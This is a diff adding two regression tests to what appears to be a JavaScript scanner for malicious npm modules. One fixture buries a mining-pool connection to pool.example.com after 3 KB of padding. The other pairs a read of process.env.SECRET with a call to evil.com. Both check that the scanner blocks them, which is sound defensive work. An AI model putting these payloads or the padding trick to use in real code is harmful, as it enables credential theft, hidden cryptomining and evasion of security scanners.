@@ -247,6 +247,38 @@ test('Sub-512-byte clean module has no false positive (F-01 regression guard)', 
   assert.strictEqual(result.detections.length, 0, 'Clean tiny module should produce no detections');
 });
 
+// 15. Padding bypass (F-03 regression guard)
+// Malicious payload buried after 3 KB of benign-looking filler.
+// Previously the 2 KB truncation would have caused the scanner to miss it entirely.
+test('Padded-payload: malicious signature after 3KB padding is blocked (F-03 regression guard)', () => {
+  const padding = '// ' + 'a'.repeat(3000) + '\n';
+  const payload = 'module.exports.connect = () => require("net").createConnection("stratum+tcp://pool.example.com", 3333);\n';
+  const src = padding + payload;
+  assert.ok(src.length > 3000, `Fixture must exceed 3000 bytes (actual: ${src.length})`);
+  const result = detector.scanModuleSync('padded-miner.js', src, 'padded-miner.js');
+  const blockDetections = result.detections.filter(d => !d.warnOnly);
+  assert.ok(
+    blockDetections.length > 0,
+    `Expected BLOCK-tier detection for padded payload but got none. detections=${JSON.stringify(result.detections)}`
+  );
+});
+
+// 16. Small module (<100 bytes) behavioral detection (F-07 regression guard)
+// Previously behavior-tracker.js had a `content.length < 100` guard that silently skipped
+// tiny modules. Even a 50-byte module can exfiltrate credentials.
+test('Sub-100-byte module with credential-read + network-egress triggers behavioral detection (F-07 regression guard)', () => {
+  detector.behaviorTracker.reset();
+  // 72-byte payload: reads env (sensitiveRead) and makes a network call (networkEgress)
+  const src = 'process.env.SECRET; https.get("http://evil.com");';
+  assert.ok(src.length < 100, `Fixture must be <100 bytes (actual: ${src.length})`);
+  const result = detector.scanModuleSync('tiny-exfil.js', src, 'tiny-exfil.js');
+  const blockDetections = result.detections.filter(d => !d.warnOnly);
+  assert.ok(
+    blockDetections.length > 0,
+    `Expected behavioral CREDENTIAL_EXFILTRATION detection but got none. detections=${JSON.stringify(result.detections)}`
+  );
+});
+
 // ─── report ──────────────────────────────────────────────────────────────────
 
 console.log('\n═══════════════════════════════════════════════════════════════');
